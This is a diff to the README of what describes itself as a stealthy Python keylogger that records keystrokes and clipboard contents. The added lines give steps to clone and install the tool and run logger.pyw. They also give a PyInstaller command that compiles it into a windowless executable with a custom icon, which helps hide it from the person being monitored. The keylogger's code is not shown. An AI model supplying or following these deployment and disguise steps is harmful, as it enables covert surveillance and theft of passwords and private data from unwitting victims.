@@ -14,4 +14,16 @@ A stealthy Python-based keylogger that captures keyboard inputs, clipboard conte
 
 1. Clone this repository:
    ```bash
-   git clone https://github.com/yourusername/python-keylogger.git
+   git clone https://github.com/vux06/Advanced-Keylogger.git
+   cd Advanced-Keylogger
+   pip install -r requirements.txt
+   ```
+2. Usage
+   ```bash
+   python3 logger.pyw
+   ```
+## You can convert it into an exe file by 
+
+```bash
+pyinstaller --onefile --noconsole --icon=myicon.ico your_script.pyw
+```
